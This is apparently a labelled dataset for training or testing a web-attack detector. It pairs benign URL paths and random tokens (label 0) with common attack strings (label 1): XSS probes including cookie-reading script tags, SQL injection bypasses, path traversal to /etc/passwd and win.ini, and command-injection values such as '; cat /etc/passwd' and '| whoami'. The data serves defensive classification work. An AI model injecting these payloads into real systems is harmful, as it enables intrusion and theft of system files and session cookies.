<script>var a=910;alert(a)</script>,1
' OR 8=9 --,1
admin%00' OR 1=1,1
/contact?session=43817,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/register?session=71079,0
s E l E c T * f R o M a d m i n,1
register,0
/search?session=81629,0
' OR '1'='1,1
admin' --,1
onerror=alert(1),1
/about?id=9124,0
user,0
search,0
<script>var a=11;alert(a)</script>,1
onerror=alert(1),1
22W5LePbspYn1w,0
<script>var a=302;alert(a)</script>,1
IzJgjwXdxX7AgG,0
/home?id=7704,0
/contact?session=29108,0
/home?session=22867,0
' OR '1'='1,1
dashboard,0
' OR 8=4 --,1
/search?id=5198,0
admin'/* bypass */OR 1=1,1
' OR '1'='1,1
admin' --,1
/settings?session=16631,0
contact,0
<script>var a=958;alert(a)</script>,1
GsjDEMy7R,0
' OR 4=8 --,1
QqFzOVly5qJHcEJ,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/home?session=16660,0
cart,0
onerror=alert(1),1
<script>var a=826;alert(a)</script>,1
javascript:alert(1),1
javascript:alert(1),1
| whoami,1
/contact?session=66978,0
/cart?id=4534,0
../../../windows/win.ini,1
login,0
<script>var a=605;alert(a)</script>,1
/search?id=5781,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/login?id=7504,0
; cat /etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/dashboard?id=1765,0
user,0
<script>var a=385;alert(a)</script>,1
<script>var a=759;alert(a)</script>,1
dHHJu8gMnN,0
Du3AV8wc,0
<script>var a=953;alert(a)</script>,1
user,0
register,0
<script>var a=94;alert(a)</script>,1
/home?id=6711,0
<script>var a=146;alert(a)</script>,1
/search?id=8033,0
E5JztNVwDNbw,0
<script>alert(document.cookie)</script>,1
/about?id=6277,0
/login?id=508,0
1' o r '1'='1,1
/register?session=66044,0
rmlXDKpshlQ2Pz,0
' OR 1=1 --,1
/login?id=7882,0
/about?id=2961,0
gssjMd48qSoxUV,0
/blog?session=96977,0
1' o r '1'='1,1
' OR 5=1 --,1
s E l E c T * f R o M a d m i n,1
/search?id=4885,0
onerror=alert(1),1
/about?id=8397,0
/index?id=932,0
' OR 3=1 --,1
../../../../etc/passwd,1
' OR '1'='1,1
/dashboard?id=6690,0
admin' --,1
s E l E c T * f R o M a d m i n,1
admin' --,1
home,0
/search?id=2235,0
profile,0
/login?id=7289,0
user,0
' OR 5=4 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/profile?session=14600,0
/index?session=65633,0
l08g2l6YUBXeYqX,0
/search?id=4924,0
1' o r '1'='1,1
/index?id=8199,0
N6OdFCHQst,0
/user?session=32539,0
/search?id=323,0
admin' --,1
cart,0
wBVMdU0g7IM,0
/index?id=4793,0
' OR 2=5 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/about?session=46423,0
' OR 1=1 --,1
<script>var a=192;alert(a)</script>,1
search,0
<script>var a=814;alert(a)</script>,1
../../../windows/win.ini,1
Qtqpue6qV,0
<script>var a=354;alert(a)</script>,1
/cart?session=68527,0
admin'/* bypass */OR 1=1,1
/login?session=97277,0
s E l E c T * f R o M a d m i n,1
; cat /etc/passwd,1
hljRPOtabbK,0
L9JcONnQ7L,0
/home?session=76872,0
DDGP8b5VThXo,0
onerror=alert(1),1
UwjbC8UCtjE,0
/search?session=17012,0
' OR 3=4 --,1
<script>var a=740;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
/search?id=7217,0
index,0
MzqdOwVh97,0
/cart?session=47243,0
/about?id=6122,0
user,0
bFlxhrHrjQug,0
register,0
admin' --,1
<script>var a=273;alert(a)</script>,1
/index?session=40743,0
FHFAVG9aTzI3J,0
home,0
<script>var a=858;alert(a)</script>,1
profile,0
s E l E c T * f R o M a d m i n,1
S13YplO6KBL,0
ILXvzTbVjH,0
contact,0
' OR 3=1 --,1
' OR 6=9 --,1
javascript:alert(1),1
/contact?id=6817,0
' OR 9=3 --,1
' OR 7=9 --,1
onerror=alert(1),1
admin' --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
onerror=alert(1),1
U N I O N   S E L E C T   * F R O M   u s e r s,1
| whoami,1
' OR '1'='1,1
; cat /etc/passwd,1
' OR 1=8 --,1
about,0
dashboard,0
' OR 4=4 --,1
' OR 9=5 --,1
../../../../etc/passwd,1
<script>var a=435;alert(a)</script>,1
' OR 4=2 --,1
; cat /etc/passwd,1
' OR 3=6 --,1
/dashboard?session=75330,0
HAyjA45x,0
/login?id=9114,0
/profile?id=6240,0
/login?id=3323,0
../../../windows/win.ini,1
1' o r '1'='1,1
15GLbdI9KxlKuw,0
blog,0
/checkout?id=491,0
/login?session=51571,0
login,0
' OR 4=9 --,1
register,0
mXT8P6QwMbNgzjU,0
' OR 3=6 --,1
TQoq5k4Agypr3iz,0
/about?session=25619,0
/login?id=3529,0
/user?id=3723,0
dashboard,0
/user?session=78993,0
<script>var a=374;alert(a)</script>,1
/index?session=92595,0
admin'/* bypass */OR 1=1,1
/cart?id=9326,0
index,0
avkmAgSlKZX,0
/index?session=11963,0
../../../../etc/passwd,1
' OR 2=2 --,1
about,0
/register?id=4703,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/settings?session=58953,0
/checkout?id=7480,0
/checkout?session=62218,0
' OR 4=9 --,1
' OR 5=8 --,1
<script>var a=392;alert(a)</script>,1
user,0
login,0
<script>var a=603;alert(a)</script>,1
admin%00' OR 1=1,1
/about?id=6825,0
/contact?session=59551,0
register,0
<script>var a=375;alert(a)</script>,1
/login?id=2213,0
/index?session=60579,0
' OR 5=9 --,1
<script>var a=938;alert(a)</script>,1
/user?id=3018,0
/cart?id=5990,0
/index?session=40275,0
../../../../etc/passwd,1
javascript:alert(1),1
' OR '1'='1,1
' OR 2=6 --,1
/cart?session=25421,0
settings,0
cart,0
' OR 6=1 --,1
/contact?id=9296,0
settings,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/user?session=85550,0
index,0
contact,0
/search?id=5392,0
about,0
<script>var a=941;alert(a)</script>,1
ykHL0MoakI,0
login,0
admin'/* bypass */OR 1=1,1
/search?id=253,0
' OR 4=1 --,1
uS2fSvenJZFIcLT,0
settings,0
/settings?id=9655,0
blog,0
nN7KLnVL,0
/cart?id=8057,0
ZsQu8yaPCTWPztY,0
javascript:alert(1),1
../../../windows/win.ini,1
' OR '1'='1,1
<script>alert(document.cookie)</script>,1
<script>var a=179;alert(a)</script>,1
../../../../etc/passwd,1
/register?session=24780,0
<script>var a=812;alert(a)</script>,1
/register?id=1981,0
/about?session=85307,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
j8UtUa57pcF0,0
' OR 8=1 --,1
/profile?id=1069,0
s E l E c T * f R o M a d m i n,1
/about?id=3280,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/user?session=46115,0
admin'/* bypass */OR 1=1,1
y1RpT8Cz5,0
blog,0
checkout,0
/about?session=43367,0
profile,0
/cart?id=9441,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/home?session=75874,0
<script>var a=658;alert(a)</script>,1
/login?id=9686,0
javascript:alert(1),1
s E l E c T * f R o M a d m i n,1
<script>var a=276;alert(a)</script>,1
' OR '1'='1,1
/index?id=6798,0
/register?id=3992,0
' OR 5=3 --,1
<script>alert(document.cookie)</script>,1
profile,0
DmV6latA9Oz,0
' OR 8=3 --,1
admin'/* bypass */OR 1=1,1
/cart?id=9841,0
/register?id=4848,0
dashboard,0
s E l E c T * f R o M a d m i n,1
<script>var a=786;alert(a)</script>,1
Nb9aj0WYXu02,0
/blog?session=83671,0
s E l E c T * f R o M a d m i n,1
<script>var a=772;alert(a)</script>,1
<script>var a=349;alert(a)</script>,1
/index?session=84570,0
/search?id=6391,0
/dashboard?session=38083,0
' OR 6=7 --,1
<script>var a=74;alert(a)</script>,1
/user?session=19403,0
1' o r '1'='1,1
onerror=alert(1),1
s E l E c T * f R o M a d m i n,1
1mjZR8MULK,0
s E l E c T * f R o M a d m i n,1
; cat /etc/passwd,1
uSr1Tko1N,0
uGQcq9OGtRVzh,0
profile,0
<script>var a=272;alert(a)</script>,1
/dashboard?id=52,0
home,0
admin'/* bypass */OR 1=1,1
/home?id=8650,0
<script>var a=453;alert(a)</script>,1
checkout,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/index?id=6597,0
QqvQoZhGhm4IDUP,0
/dashboard?session=49967,0
| whoami,1
<script>var a=459;alert(a)</script>,1
search,0
/search?session=58605,0
<script>var a=175;alert(a)</script>,1
; cat /etc/passwd,1
' OR 7=9 --,1
/blog?session=94957,0
bNscojCj0nv4L,0
<script>alert(document.cookie)</script>,1
kY6sDTjsxfu,0
blog,0
s E l E c T * f R o M a d m i n,1
C7Hl9sXKhXx,0
<script>var a=271;alert(a)</script>,1
/search?session=89410,0
../../../windows/win.ini,1
<script>alert(document.cookie)</script>,1
xkZ8JKMy1DXSTTL,0
javascript:alert(1),1
contact,0
lkqQXNdJJ,0
/home?session=76020,0
dashboard,0
onerror=alert(1),1
/profile?id=2259,0
' OR 1=1 --,1
/cart?id=8896,0
/cart?session=53414,0
about,0
<script>var a=466;alert(a)</script>,1
' OR 9=2 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=920;alert(a)</script>,1
' OR 8=7 --,1
1' o r '1'='1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/blog?id=3556,0
/index?id=4864,0
QqcPdRZoY,0
about,0
' OR 6=8 --,1
<script>var a=77;alert(a)</script>,1
/user?session=81326,0
javascript:alert(1),1
TvoyHUhCOEf,0
; cat /etc/passwd,1
/cart?id=6234,0
/checkout?session=12106,0
admin' --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/index?id=9215,0
/contact?id=3541,0
CxZnuVEOZVfw,0
<script>var a=682;alert(a)</script>,1
/dashboard?id=5089,0
5HKgVQ6qA3A1oNT,0
/index?id=107,0
/checkout?id=8090,0
/register?id=4825,0
' OR 7=1 --,1
javascript:alert(1),1
/profile?id=7142,0
/settings?id=7939,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
settings,0
admin' --,1
home,0
' OR 8=1 --,1
/about?session=57426,0
../../../windows/win.ini,1
admin%00' OR 1=1,1
mgbyR2RH2a,0
XR9CXI0xh6t,0
/cart?session=56659,0
' OR 4=1 --,1
1Vc5sCZXSn4D,0
vEEB09gw4,0
/login?id=543,0
<script>var a=23;alert(a)</script>,1
/profile?session=74770,0
k4vbRRD3Bh,0
../../../../etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
eBw1jbQyXyZb,0
rHVLE1K0kTBnfRA,0
; cat /etc/passwd,1
/home?id=1610,0
<script>var a=502;alert(a)</script>,1
UIQxQ1XOsd2,0
onerror=alert(1),1
77zixVo3vvajpQ,0
WeiUZQghRFadKR1,0
s E l E c T * f R o M a d m i n,1
vM2fB3mxv7Ki1M,0
admin'/* bypass */OR 1=1,1
6dOwzJyar,0
lPRfZ5Mztxg6L,0
admin' --,1
<script>var a=475;alert(a)</script>,1
../../../../etc/passwd,1
' OR 3=2 --,1
' OR '1'='1,1
zsps9caaq5Nwiy,0
../../../../etc/passwd,1
profile,0
onerror=alert(1),1
/about?session=27702,0
<script>var a=815;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
onerror=alert(1),1
/contact?id=2584,0
21tEJOPfUt11e,0
/register?session=85583,0
/login?session=36192,0
1' o r '1'='1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 1=1 --,1
' OR 1=1 --,1
../../../windows/win.ini,1
login,0
/search?session=59675,0
<script>var a=824;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>alert(document.cookie)</script>,1
../../../windows/win.ini,1
7Jk3xhlfJ6tOIt,0
Q5CZ3NYpSIe8,0
<script>var a=165;alert(a)</script>,1
/cart?id=9327,0
<script>alert(document.cookie)</script>,1
<script>alert(document.cookie)</script>,1
/about?session=84586,0
settings,0
' OR 6=5 --,1
../../../windows/win.ini,1
/register?id=6082,0
s E l E c T * f R o M a d m i n,1
s E l E c T * f R o M a d m i n,1
/checkout?id=9390,0
login,0
/index?id=5267,0
../../../../etc/passwd,1
; cat /etc/passwd,1
<script>var a=888;alert(a)</script>,1
1' o r '1'='1,1
DbmVnUii0,0
<script>var a=25;alert(a)</script>,1
../../../../etc/passwd,1
../../../../etc/passwd,1
<script>var a=241;alert(a)</script>,1
' OR 1=1 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=373;alert(a)</script>,1
/contact?session=82612,0
javascript:alert(1),1
10GWMghtmPkKH,0
checkout,0
/checkout?session=25026,0
../../../windows/win.ini,1
<script>var a=942;alert(a)</script>,1
/settings?id=8592,0
2fDbzKzEa9,0
../../../windows/win.ini,1
' OR 1=5 --,1
/search?id=4819,0
login,0
' OR '1'='1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=767;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
/register?id=3414,0
profile,0
<script>alert(document.cookie)</script>,1
/index?session=60499,0
/search?session=94451,0
/blog?id=7694,0
/settings?id=1754,0
onerror=alert(1),1
/home?session=66866,0
' OR 5=4 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
tW24tAVMbK,0
<script>var a=56;alert(a)</script>,1
/profile?session=23378,0
<script>var a=516;alert(a)</script>,1
ZHafTAqcdqV7,0
admin'/* bypass */OR 1=1,1
/blog?id=2940,0
' OR '1'='1,1
' OR 4=5 --,1
/register?id=3973,0
/settings?id=244,0
s E l E c T * f R o M a d m i n,1
Ye27Wux0CZ8ladk,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 2=7 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/search?session=95164,0
; cat /etc/passwd,1
<script>var a=205;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
| whoami,1
3y3QetV45,0
onerror=alert(1),1
profile,0
<script>var a=997;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
hy7q2wUXwfg,0
javascript:alert(1),1
HmO8fQt2x,0
/settings?session=10422,0
admin' --,1
/blog?session=36302,0
admin'/* bypass */OR 1=1,1
<script>var a=960;alert(a)</script>,1
ccdm7MfH0,0
/home?id=9967,0
9gbSzWN3ZD,0
6HMCK8HpEu,0
WenaoOQRe,0
/blog?session=73115,0
onerror=alert(1),1
' OR 2=8 --,1
/blog?id=1286,0
<script>var a=875;alert(a)</script>,1
<script>var a=346;alert(a)</script>,1
FtBVqU0P,0
bzNRtjUYO5,0
<script>alert(document.cookie)</script>,1
<script>var a=258;alert(a)</script>,1
' OR 9=2 --,1
6jQBypSKuvb8H,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=937;alert(a)</script>,1
' OR '1'='1,1
/login?session=75830,0
| whoami,1
' OR 1=1 --,1
<script>var a=215;alert(a)</script>,1
shArIOujnyjgK8,0
/login?session=20763,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 8=8 --,1
/search?session=39752,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
contact,0
dashboard,0
/login?id=1240,0
/cart?id=5866,0
oSqigIY5IjZQ,0
/checkout?session=23666,0
' OR '1'='1,1
' OR '1'='1,1
' OR 3=8 --,1
' OR 1=1 --,1
/dashboard?session=96241,0
<script>var a=782;alert(a)</script>,1
/contact?session=84606,0
user,0
/register?session=31916,0
<script>var a=148;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
' OR 1=4 --,1
javascript:alert(1),1
checkout,0
admin%00' OR 1=1,1
aAnsE88CF,0
; cat /etc/passwd,1
/register?session=97312,0
' OR '1'='1,1
<script>var a=504;alert(a)</script>,1
admin%00' OR 1=1,1
../../../../etc/passwd,1
<script>var a=629;alert(a)</script>,1
blog,0
index,0
| whoami,1
/search?session=86553,0
' OR '1'='1,1
ZYEJ1ekZjmoj2rp,0
user,0
Ogf0VRxEAuD,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/profile?session=41614,0
/home?session=79060,0
/home?session=29274,0
<script>var a=107;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
home,0
dashboard,0
/register?session=11590,0
javascript:alert(1),1
/blog?session=12693,0
/checkout?id=5472,0
/index?session=20258,0
/checkout?session=23902,0
/dashboard?session=82658,0
search,0
; cat /etc/passwd,1
C5fOjxwm,0
' OR 1=1 --,1
XXYkqCIn,0
; cat /etc/passwd,1
about,0
' OR 5=7 --,1
<script>var a=771;alert(a)</script>,1
' OR '1'='1,1
Ffp6IAWerYh,0
/profile?id=8005,0
onerror=alert(1),1
mkZtcZ36,0
' OR 5=6 --,1
' OR 3=3 --,1
onerror=alert(1),1
javascript:alert(1),1
checkout,0
/settings?id=8429,0
<script>var a=626;alert(a)</script>,1
' OR 3=3 --,1
/checkout?id=6392,0
javascript:alert(1),1
; cat /etc/passwd,1
/about?id=7290,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
login,0
onerror=alert(1),1
cart,0
/profile?session=58539,0
9CUl2mSP8Qb,0
/settings?session=23073,0
<script>var a=332;alert(a)</script>,1
/about?session=89952,0
admin'/* bypass */OR 1=1,1
<script>var a=959;alert(a)</script>,1
<script>var a=294;alert(a)</script>,1
/search?id=6143,0
' OR '1'='1,1
/settings?session=24559,0
| whoami,1
; cat /etc/passwd,1
../../../../etc/passwd,1
/cart?id=4672,0
login,0
CHKJl7BxlK9JBm,0
Q01aHjZWkPHQSsU,0
admin' --,1
JSLr1wS5tshS,0
index,0
javascript:alert(1),1
/register?session=74107,0
../../../windows/win.ini,1
cart,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin' --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=333;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
onerror=alert(1),1
ADlcFWhCL,0
/index?session=40229,0
s E l E c T * f R o M a d m i n,1
' OR 1=1 --,1
' OR 7=3 --,1
/index?session=37433,0
index,0
lr5oAsZSi,0
<script>var a=961;alert(a)</script>,1
/home?id=2584,0
../../../../etc/passwd,1
about,0
/contact?session=25767,0
<script>var a=647;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
<script>var a=154;alert(a)</script>,1
<script>var a=761;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
C2FePsBgvd,0
' OR 4=7 --,1
../../../../etc/passwd,1
../../../../etc/passwd,1
/checkout?id=8145,0
1' o r '1'='1,1
/blog?id=7690,0
' OR '1'='1,1
<script>var a=439;alert(a)</script>,1
/settings?id=7172,0
about,0
/login?session=51541,0
<script>var a=176;alert(a)</script>,1
' OR '1'='1,1
zpliiqaghLJw1,0
/login?id=6908,0
onerror=alert(1),1
' OR 8=2 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 5=5 --,1
/profile?id=2773,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
YfdItqGoT,0
<script>var a=686;alert(a)</script>,1
user,0
86u8ws41Gsb2d,0
Mm4hBSskFDsHp4n,0
admin' --,1
' OR 2=4 --,1
contact,0
checkout,0
../../../windows/win.ini,1
/settings?id=8904,0
javascript:alert(1),1
; cat /etc/passwd,1
javascript:alert(1),1
8ugKljXXk88CwJx,0
dashboard,0
/register?session=34196,0
home,0
checkout,0
/user?id=7374,0
| whoami,1
' OR '1'='1,1
/dashboard?session=68488,0
| whoami,1
<script>var a=24;alert(a)</script>,1
/checkout?session=17381,0
<script>var a=46;alert(a)</script>,1
javascript:alert(1),1
/contact?session=27549,0
/search?id=6577,0
/login?id=576,0
home,0
1' o r '1'='1,1
onerror=alert(1),1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/contact?id=3541,0
' OR 3=6 --,1
' OR 9=4 --,1
| whoami,1
<script>var a=679;alert(a)</script>,1
<script>var a=773;alert(a)</script>,1
/login?session=11277,0
cart,0
admin%00' OR 1=1,1
/register?session=24444,0
/login?session=96407,0
settings,0
/index?id=5440,0
../../../../etc/passwd,1
' OR 9=4 --,1
<script>var a=176;alert(a)</script>,1
' OR 4=2 --,1
../../../../etc/passwd,1
admin'/* bypass */OR 1=1,1
' OR 6=4 --,1
' OR 1=1 --,1
' OR 9=6 --,1
MgNUX68dX,0
user,0
' OR 7=8 --,1
/profile?id=7763,0
n3uBJiwH,0
/search?session=85041,0
/register?id=6378,0
O4CeirnLqmRVcQk,0
' OR 1=8 --,1
<script>var a=958;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin'/* bypass */OR 1=1,1
admin' --,1
' OR 7=9 --,1
<script>var a=857;alert(a)</script>,1
/user?session=62764,0
admin%00' OR 1=1,1
sPQgQurNnzR,0
' OR 2=1 --,1
/settings?session=52248,0
<script>var a=248;alert(a)</script>,1
maTPROboN83H,0
home,0
ISfs6wE78IFecYe,0
profile,0
' OR 6=8 --,1
../../../windows/win.ini,1
/contact?id=4444,0
../../../../etc/passwd,1
../../../../etc/passwd,1
' OR 6=2 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/profile?id=8210,0
s E l E c T * f R o M a d m i n,1
javascript:alert(1),1
<script>var a=989;alert(a)</script>,1
admin%00' OR 1=1,1
home,0
/blog?session=20848,0
admin%00' OR 1=1,1
<script>var a=927;alert(a)</script>,1
../../../windows/win.ini,1
/search?session=33736,0
s E l E c T * f R o M a d m i n,1
/home?id=4479,0
H53bvrHii6y,0
user,0
' OR 6=6 --,1
/about?id=16,0
PgiZNH6jzjWa,0
s E l E c T * f R o M a d m i n,1
I4ACCAtkCOya,0
<script>var a=388;alert(a)</script>,1
/register?session=27551,0
9k7jIK7vmwjNf,0
/settings?session=17111,0
admin%00' OR 1=1,1
dashboard,0
/home?session=33440,0
admin' --,1
' OR 5=4 --,1
<script>var a=310;alert(a)</script>,1
/blog?session=88571,0
s E l E c T * f R o M a d m i n,1
/about?session=92422,0
/login?id=1549,0
/contact?id=9212,0
' OR '1'='1,1
/profile?id=2144,0
dashboard,0
| whoami,1
/about?id=9380,0
home,0
blog,0
GPPIQVnVm,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
1' o r '1'='1,1
<script>var a=982;alert(a)</script>,1
about,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/settings?session=76081,0
' OR '1'='1,1
contact,0
/blog?id=6080,0
Q1pTh42SCFno,0
user,0
' OR 9=9 --,1
ILssXHsWE,0
/login?session=87839,0
<script>var a=258;alert(a)</script>,1
settings,0
' OR 9=1 --,1
javascript:alert(1),1
../../../../etc/passwd,1
index,0
/blog?session=79870,0
<script>var a=642;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
yhH7gYJGtwXApMt,0
; cat /etc/passwd,1
/index?id=5608,0
SFjBBKY42mwO3,0
/about?session=23644,0
<script>var a=559;alert(a)</script>,1
<script>var a=250;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=369;alert(a)</script>,1
<script>var a=689;alert(a)</script>,1
/settings?session=72427,0
cart,0
<script>var a=201;alert(a)</script>,1
/user?id=9571,0
1' o r '1'='1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/home?id=900,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin' --,1
onerror=alert(1),1
' OR 9=5 --,1
<script>alert(document.cookie)</script>,1
s E l E c T * f R o M a d m i n,1
/contact?id=496,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
PFbAw7CS,0
/register?session=88622,0
/blog?session=85803,0
/home?id=1222,0
/login?id=8918,0
dashboard,0
/user?session=76339,0
/dashboard?session=40390,0
' OR '1'='1,1
; cat /etc/passwd,1
home,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
settings,0
/register?id=7252,0
' OR 1=9 --,1
' OR '1'='1,1
/settings?session=87584,0
onerror=alert(1),1
/cart?id=6674,0
search,0
search,0
/checkout?session=93113,0
1' o r '1'='1,1
7zgeMHSfMNZrM,0
dashboard,0
about,0
FF8MTC8cD,0
admin%00' OR 1=1,1
s E l E c T * f R o M a d m i n,1
home,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 7=9 --,1
admin' --,1
1' o r '1'='1,1
home,0
settings,0
settings,0
s E l E c T * f R o M a d m i n,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
javascript:alert(1),1
admin'/* bypass */OR 1=1,1
' OR 1=1 --,1
; cat /etc/passwd,1
index,0
/user?session=22345,0
AHyES3OC8,0
/about?id=4012,0
onerror=alert(1),1
../../../windows/win.ini,1
about,0
cart,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
onerror=alert(1),1
/index?session=47123,0
' OR 4=6 --,1
admin'/* bypass */OR 1=1,1
/login?session=69303,0
9iiAr8AgM2Gj,0
javascript:alert(1),1
KKYQa80KTy,0
/register?session=11104,0
/cart?session=44743,0
../../../windows/win.ini,1
/about?session=90291,0
<script>alert(document.cookie)</script>,1
s E l E c T * f R o M a d m i n,1
' OR 6=5 --,1
/dashboard?session=69377,0
' OR 1=7 --,1
f25hKeChCg,0
../../../windows/win.ini,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/register?id=6777,0
/settings?session=88230,0
checkout,0
/dashboard?id=7660,0
<script>var a=826;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
<script>var a=459;alert(a)</script>,1
/login?id=3112,0
blog,0
' OR 1=1 --,1
admin'/* bypass */OR 1=1,1
raxqejQUW0h5Yy,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin%00' OR 1=1,1
admin%00' OR 1=1,1
WT4uXhDj,0
search,0
search,0
' OR 9=2 --,1
' OR 1=1 --,1
' OR 5=5 --,1
/cart?session=16596,0
/cart?id=833,0
' OR 7=3 --,1
home,0
' OR 2=1 --,1
admin%00' OR 1=1,1
' OR 1=4 --,1
<script>var a=66;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR '1'='1,1
<script>var a=833;alert(a)</script>,1
Ru5A6Ljqvfjk,0
Ma676znLwgKSEp,0
' OR 4=4 --,1
lqrY9pqrGrctaiD,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin'/* bypass */OR 1=1,1
/blog?session=88625,0
/about?id=9330,0
<script>var a=113;alert(a)</script>,1
2OVpIBq70Dk8Ar,0
/about?id=9348,0
/profile?session=19698,0
/blog?id=59,0
<script>var a=489;alert(a)</script>,1
' OR 2=1 --,1
' OR 9=3 --,1
/login?id=6477,0
blog,0
/checkout?id=1467,0
<script>var a=695;alert(a)</script>,1
onerror=alert(1),1
register,0
/login?session=64242,0
cart,0
/checkout?session=13398,0
/about?id=4013,0
javascript:alert(1),1
/settings?session=90614,0
; cat /etc/passwd,1
x6Epq4MfN4,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/register?id=4854,0
/blog?id=699,0
' OR 8=2 --,1
' OR 2=8 --,1
/checkout?session=80150,0
about,0
' OR 8=4 --,1
/profile?session=94881,0
n6Ibgwn7aZLwz8,0
s E l E c T * f R o M a d m i n,1
/login?session=20601,0
checkout,0
/profile?id=107,0
javascript:alert(1),1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=826;alert(a)</script>,1
index,0
<script>var a=790;alert(a)</script>,1
' OR 9=8 --,1
RaOpacS01ypSBmK,0
<script>var a=193;alert(a)</script>,1
/contact?session=16857,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
sU9vnSdFbHxS6,0
' OR 2=7 --,1
admin'/* bypass */OR 1=1,1
login,0
' OR 2=1 --,1
wupIewujK,0
/home?id=762,0
<script>var a=402;alert(a)</script>,1
| whoami,1
profile,0
/profile?id=1118,0
| whoami,1
/profile?session=75094,0
/register?session=61449,0
qX8jL0Zhl3Db,0
/register?id=9516,0
onerror=alert(1),1
admin%00' OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=977;alert(a)</script>,1
../../../windows/win.ini,1
/dashboard?id=4775,0
1' o r '1'='1,1
/register?id=2008,0
| whoami,1
admin' --,1
onerror=alert(1),1
<script>var a=617;alert(a)</script>,1
KhTNcLAvKaK,0
QhwCaHTTK,0
LucIv614gwn,0
' OR '1'='1,1
ugMA9YO1jtkNB,0
login,0
admin%00' OR 1=1,1
javascript:alert(1),1
; cat /etc/passwd,1
admin'/* bypass */OR 1=1,1
/about?id=8448,0
Gm4OmELR,0
xIxORmqQ1Jaqv,0
/user?id=4479,0
../../../../etc/passwd,1
/home?session=69079,0
CTI9M7mSYFPY8gi,0
dashboard,0
contact,0
/user?session=12090,0
' OR 1=1 --,1
<script>var a=327;alert(a)</script>,1
9gmsuHjtx423,0
cart,0
' OR 8=8 --,1
/home?id=2257,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
LZatJkfsWxbY9to,0
../../../../etc/passwd,1
' OR '1'='1,1
sSlz8WXRQ6Ei,0
../../../windows/win.ini,1
zi7GJIvm,0
/home?id=3233,0
onerror=alert(1),1
<script>var a=909;alert(a)</script>,1
' OR 3=3 --,1
34tIpN5koAwFw7,0
' OR 1=1 --,1
1' o r '1'='1,1
' OR 1=9 --,1
wIYCKv7Bf5,0
' OR '1'='1,1
' OR 4=9 --,1
v0hnrPct,0
' OR '1'='1,1
/checkout?id=4554,0
/about?session=31502,0
jkHNKyiYNoYBNZ,0
